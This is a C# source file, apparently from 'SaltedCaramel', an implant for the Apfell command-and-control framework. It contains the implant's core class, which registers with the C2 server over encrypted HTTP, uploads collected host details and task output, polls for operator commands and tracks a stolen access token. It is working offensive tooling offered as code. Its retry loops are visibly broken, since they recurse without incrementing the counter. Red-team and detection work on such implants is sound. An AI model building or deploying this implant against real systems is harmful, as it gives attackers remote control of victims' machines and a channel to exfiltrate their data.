using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace SaltedCaramel
{
    /// <summary>
    /// Struct for formatting task output or other information to send back
    /// to Apfell server
    /// </summary>
    internal struct SCTaskResp
    {
        public string response;
        public string id;

        public SCTaskResp(string response, string id)
        {
            this.response = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(response));
            this.id = id;
        }
    }

    /// <summary>
    /// Struct for the reply we get when sending a file to the Apfell server
    /// Contains file ID to use when sending a file to the server
    /// </summary>
    internal struct DownloadReply
    {
        public string file_id { get; set; }
    }

    /// <summary>
    /// Struct for file chunks, used when sending files to the Apfell server
    /// </summary>
    internal struct FileChunk
    {
        public int chunk_num;
        public string file_id;
        public string chunk_data;
    }

    /// <summary>
    /// This class contains all methods used by the CaramelImplant
    /// </summary>
    internal class SCImplant
    {
        internal string callbackId { get; set; }
        internal string endpoint { get; set; }
        public string host { get; set; }
        public string ip { get; set; }
        public int pid { get; set; }
        public int sleep { get; set; }
        public string user { get; set; }
        public string uuid { get; set; }
        public string domain { get; set; }
        public string os { get; set; }
        public string architecture { get; set; }
        private int retry { get; set; }
        internal byte[] PSK { get; set; }
        internal SCCrypto crypto = new SCCrypto();

        /// <summary>
        /// Post a response to the Apfell endpoint
        /// </summary>
        /// <param name="taskresp">The response to post to the endpoint</param>
        /// <returns>String with the Apfell server's reply</returns>
        public string SCPostResp(SCTaskResp taskresp)
        {
            string endpoint = this.endpoint + "responses/" + taskresp.id;
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server
                string json = JsonConvert.SerializeObject(taskresp);
                string encrypted = crypto.Encrypt(json);
                string result = crypto.Decrypt(HTTP.Post(endpoint, encrypted));
                Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.id}: {result}");
                if (result.Contains("success"))
                    // If it was successful, return the result
                    return result;
                else
                {
                    // If we didn't get success, retry and increment counter
                    while (retry < 20)
                    {
                        Debug.WriteLine($"[!] PostResponse - ERROR: Unable to post task response for {taskresp.id}, retrying...");
                        Thread.Sleep(this.sleep);
                        this.SCPostResp(taskresp);
                    }
                    retry++;
                    throw (new Exception("[!] PostResponse - ERROR: Retries exceeded"));
                }
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }

        }

        public void SendComplete(string taskId)
        {
            Debug.WriteLine($"[+] SendComplete - Sending task complete for {taskId}");
            SCTaskResp completeResponse = new SCTaskResp("{\"completed\": true}", taskId);
            this.SCPostResp(completeResponse);
        }

        public void SendError(string taskId, string error)
        {
            Debug.WriteLine($"[+] SendError - Sending error for {taskId}: {error}");
            SCTaskResp errorResponse = new SCTaskResp("{\"completed\": true, \"status\": \"error\", \"user_output\": \"" + error + "\"}", taskId);
            this.SCPostResp(errorResponse);
        }

        /// <summary>
        /// Send initial implant callback, different from normal task response
        /// because we need to get the implant ID from Apfell server
        /// </summary>
        public void InitializeImplant()
        {
            string initEndpoint = this.endpoint + "crypto/aes_psk/" + this.uuid;
            this.retry = 0;

            crypto.PSK = this.PSK;
            try // Try block for HTTP request
            {
                // Get JSON string for implant
                // Format: {"user":"username", "host":"hostname", "pid":<pid>, "ip":<ip>, "uuid":<uuid>}
                string json = JsonConvert.SerializeObject(this);
                Debug.WriteLine($"[+] InitializeImplant - Sending {json} to {initEndpoint}");

                // Encrypt json to send to server
                string encrypted = crypto.Encrypt(json);
                
                string result = crypto.Decrypt(HTTP.Post(initEndpoint, encrypted));

                if (result.Contains("success"))
                {
                    // If it was successful, initialize implant
                    // Response is { "status": "success", "id": <id> }
                    JObject resultJSON = (JObject)JsonConvert.DeserializeObject(result);
                    this.callbackId = resultJSON.Value<string>("id");
                    string callbackStatus = resultJSON.Value<string>("status");
                    Debug.WriteLine($"[-] InitializeImplant - INITIALIZE RESPONSE: {callbackStatus}");
                    Debug.WriteLine($"[-] InitializeImplant - Callback ID is: {this.callbackId}");
                    retry = 0;
                    return;
                }
                else
                {
                    // If we didn't get success, retry and increment counter
                    while (retry < 20)
                    {
                        Debug.WriteLine("[!] InitializeImplant - ERROR: Unable to initialize implant, retrying...");
                        Thread.Sleep(this.sleep);
                        this.InitializeImplant();
                    }
                    retry++;
                    throw (new Exception("[!] InitializeImplant - ERROR: Retries exceeded when initializing implant"));
                }
            }
            catch (Exception e) // Catch exceptions from HTTP request
            {
                Debug.WriteLine(e.Message);
            }
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        public SCTask CheckTasking()
        {
            string taskEndpoint = this.endpoint + "tasks/callback/" + this.callbackId + "/nextTask";
            try // Try block for checking tasks (throws if retries exceeded)
            {
                while (retry < 20)
                {
                    try // Try block for HTTP request
                    {
                        SCTask task = JsonConvert.DeserializeObject<SCTask>(crypto.Decrypt(HTTP.Get(taskEndpoint)));
                        retry = 0;
                        if (task.command != "none")
                            Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
                        return task;
                    }
                    catch (Exception e) // Catch exceptions from HTTP request
                    {
                        retry++;
                        Debug.WriteLine("[!] CheckTasking - ERROR: " + e.Message + ", retrying...");
                        Thread.Sleep(this.sleep);
                        this.CheckTasking();
                    }
                }
                throw new Exception();
            }
            catch // Catch exception when retries exceeded
            {
                Debug.WriteLine("[!] CheckTasking - ERROR: retries exceeded.");
                return null;
            }
        }

        internal bool hasAlternateToken()
        {
            if (Token.stolenHandle != IntPtr.Zero)
                return true;
            else return false;
        }
    }
}
